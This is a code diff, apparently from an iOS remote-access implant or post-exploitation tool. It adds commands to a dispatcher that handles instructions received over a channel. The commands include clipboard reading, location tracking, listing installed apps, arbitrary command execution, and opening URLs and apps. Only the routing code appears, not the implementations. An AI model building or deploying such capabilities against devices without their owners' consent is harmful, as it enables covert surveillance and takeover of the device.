@@ -36,4 +36,32 @@ void handle_command(int channel, char *cmd, char *args)
 
     if ([cmd isEqualToString:@"sysinfo"])
         [commands cmd_sysinfo];
+    else if ([cmd isEqualToString:@"getpid"])
+        [commands cmd_getpid];
+    else if ([cmd isEqualToString:@"getpaste"])
+        [commands cmd_getpaste];
+    else if ([cmd isEqualToString:@"battery"])
+        [commands cmd_battery];
+    else if ([cmd isEqualToString:@"getvol"])
+        [commands cmd_getvol];
+    else if ([cmd isEqualToString:@"locate"])
+        [commands cmd_locate];
+    else if ([cmd isEqualToString:@"vibrate"])
+        [commands cmd_vibrate];
+    else if ([cmd isEqualToString:@"bundleids"])
+        [commands cmd_bundleids];
+    else if ([cmd isEqualToString:@"exec"])
+        [commands cmd_exec:args];
+    else if ([cmd isEqualToString:@"say"])
+        [commands cmd_say:args];
+    else if ([cmd isEqualToString:@"setvol"])
+        [commands cmd_setvol:args];
+    else if ([cmd isEqualToString:@"player"])
+        [commands cmd_player:args];
+    else if ([cmd isEqualToString:@"openapp"])
+        [commands cmd_openapp:args];
+    else if ([cmd isEqualToString:@"openurl"])
+        [commands cmd_openurl:args];
+    else if ([cmd isEqualToString:@"chdir"])
+        [commands cmd_chdir:args];
 }
